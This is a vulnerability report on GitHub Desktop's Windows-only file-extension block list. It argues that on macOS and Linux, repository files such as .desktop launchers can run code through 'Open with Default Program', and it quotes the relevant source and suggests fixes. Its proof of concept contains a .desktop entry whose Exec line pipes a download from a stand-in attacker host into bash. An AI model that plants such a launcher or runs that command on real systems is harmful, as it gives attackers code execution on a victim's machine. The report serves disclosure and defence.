### Title
Cross-platform blacklist bypass in "Open with Default Program" allows RCE from attacker-controlled repository content - (File: `app/src/ui/lib/context-menu.ts`)

### Summary
The Nextcloud report is a classic "blacklist that only covers one code path" bug: `Storage::copyFromStorage` never re-checks copied content against the same file-name blacklist enforced elsewhere, so a `.htaccess` smuggled in via federated sharing bypasses the guard entirely. GitHub Desktop has a structurally identical gap in `isSafeFileExtension()`, which is the sole gate on the "Open with Default Program" action for files coming from an attacker-controlled repository (Changes list, History view, PR file viewer). The blacklist is Windows-only; on macOS and Linux the function unconditionally returns `true`, so none of the OS-native "executable content" file types are blocked.

### Finding Description
`isSafeFileExtension` is defined as: [1](#0-0) [2](#0-1) 

```
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
```

`RestrictedFileExtensions` only lists `.cmd`, `.exe`, `.bat`, `.sh` — and even that list is only consulted `if (__WIN32__)`. On macOS/Linux the function returns `true` for every extension, including OS-native launcher/script formats that the OS itself will execute when "opened" with the default handler (e.g. `.command` scripts on macOS Terminal, `.desktop` launcher files on Linux file managers such as GNOME Files/Nautilus, `.workflow`/`.scpt` Automator/AppleScript files). This check is the only gate before Desktop calls `shell.openExternal('file://…')` on the file: [3](#0-2) 

The enable/disable wiring is repeated identically across every "Open with Default Program" surface, all trusting `isSafeExtension` as sufficient protection: [4](#0-3) [5](#0-4) [6](#0-5) 

The broken invariant: "we blacklist dangerous extensions before letting the OS default-handler open a repo-supplied file" is true for one platform and silently false for the other two — exactly the same class of failure as `Storage::copyFromStorage` skipping the `.htaccess` blacklist on the federated-share code path. The file content in all these call sites is fully attacker-controlled: it comes from a cloned repository's working tree, a fetched commit shown in History, or a pull request diff fetched from the GitHub API.

### Impact Explanation
If a victim clones or fetches a repository (or opens a PR) that contains, say, `notes.desktop` (Linux) or `setup.command` (macOS) and the app is not on Windows, right-clicking the file and choosing "Open with Default Program" — a feature explicitly exposed by Desktop's UI — invokes `shell.openExternal` on the file with no interstitial warning. The OS's default handler for these formats does not "display" the file, it executes the `Exec=`/shebang command embedded in it, giving the attacker arbitrary code execution as the victim user. This is functionally equivalent in severity to the disclosed Nextcloud RCE: attacker-controlled content reaches an unguarded execution primitive because the safety blacklist doesn't cover the path being used.

### Likelihood Explanation
Medium-high. No admin rights, no pre-existing malware, and no unnatural steps are required beyond the app's own advertised workflow (browsing changed/committed files and using "Open with Default Program", which is available for essentially every file in Changes, History, and PR review). The attacker only needs the victim to interact once with a file they were already going to look at as part of normal review of an untrusted contribution/fork/PR.

### Recommendation
- Make `isSafeFileExtension` platform-aware in both directions: maintain a blacklist (or better, an allowlist) per platform, and include macOS/Linux "executable content" formats (`.command`, `.app`, `.workflow`, `.scpt`, `.desktop`, `.terminal`, and other launcher/script formats recognized by the OS shell).
- Consider disabling "Open with Default Program" for any file that has the executable bit set in the git tree/working copy, regardless of extension.
- Apply the OS's own "quarantine"/"mark of the web" mechanism (e.g., `com.apple.quarantine` on macOS) to files opened this way so the OS's own Gatekeeper/SmartScreen prompts the user before execution, rather than relying solely on an app-level extension blacklist.

### Proof of Concept
1. On macOS or Linux, create a malicious repository containing a file, e.g. `payload.desktop` with:
   ```
   [Desktop Entry]
   Type=Application
   Name=Notes
   Exec=bash -c 'curl attacker.example/x | bash'
   ```
2. Host it and have the victim clone/fetch it in GitHub Desktop, or open it as a PR.
3. In the Changes list (or History, or PR file viewer), right-click `payload.desktop` and select "Open with Default Program". `isSafeFileExtension('.desktop')` returns `true` (non-Windows path), so `onOpenItem`/`openFile` calls `shell.openExternal('file://…/payload.desktop')`.
4. The Linux file manager's default handler executes the `Exec=` command, achieving code execution as the victim.

### Citations

**File:** app/src/ui/lib/context-menu.ts (L1-1)
```typescript
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
```

**File:** app/src/ui/lib/context-menu.ts (L34-39)
```typescript
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
```

**File:** app/src/ui/lib/open-file.ts (L1-19)
```typescript
import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}


```

**File:** app/src/ui/changes/filter-changes-list.tsx (L790-800)
```typescript
    const enabled = status.kind !== AppFileStatusKind.Deleted
    items.push(
      { type: 'separator' },
      this.getRevealInFileManagerMenuItem(file),
      this.getOpenInExternalEditorMenuItem(file, enabled),
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.props.onOpenItem(path),
        enabled: enabled && isSafeExtension,
      }
    )
```

**File:** app/src/ui/history/selected-commits.tsx (L398-420)
```typescript
    const extension = Path.extname(file.path)

    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor = externalEditorLabel
      ? `Open in ${externalEditorLabel}`
      : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => this.props.onOpenInExternalEditor(file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenItem(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
```

**File:** app/src/ui/open-pull-request/pull-request-files-changed.tsx (L176-200)
```typescript
    const { externalEditorLabel, dispatcher } = this.props

    const extension = Path.extname(file.path)
    const isSafeExtension = isSafeFileExtension(extension)
    const openInExternalEditor =
      externalEditorLabel !== undefined
        ? `Open in ${externalEditorLabel}`
        : DefaultEditorLabel

    const items: IMenuItem[] = [
      {
        label: RevealInFileManagerLabel,
        action: () => revealInFileManager(repository, file.path),
        enabled: fileExistsOnDisk,
      },
      {
        label: openInExternalEditor,
        action: () => dispatcher.openInExternalEditor(fullPath),
        enabled: fileExistsOnDisk,
      },
      {
        label: OpenWithDefaultProgramLabel,
        action: () => this.onOpenFile(file.path),
        enabled: isSafeExtension && fileExistsOnDisk,
      },
```
